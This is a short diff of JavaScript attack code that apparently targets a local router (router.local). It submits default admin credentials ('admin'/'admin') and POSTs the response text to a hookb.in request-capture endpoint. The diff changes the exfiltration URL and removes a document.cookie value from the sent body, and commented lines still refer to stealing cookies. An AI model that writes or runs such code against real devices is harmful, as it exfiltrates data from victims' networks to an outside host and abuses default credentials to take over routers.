@@ -11,7 +11,7 @@ http.onload = function () {
     if (http.readyState === http.DONE) {
         
             const xhr = new XMLHttpRequest();
-            xhr.open('POST', 'https://hookb.in/7ZMwozGbm0UWNgjjlmo2', true);
+            xhr.open('POST', 'https://hookb.in/PxdaR0WOGeTpKPrrGn8P', true);
             xhr.setRequestHeader('Content-type', 'application/json');
             xhr.send(JSON.stringify(http.responseText));
         
@@ -20,4 +20,4 @@ http.onload = function () {
 //http.open('GET', 'http://router.local');
 //"username=root&pin=admin¬Robot=on"
 //const cook = document.cookie;
-http.send(cook+"&username=admin&pin=admin&notRobot=checked");
+http.send("username=admin&pin=admin&notRobot=checked");
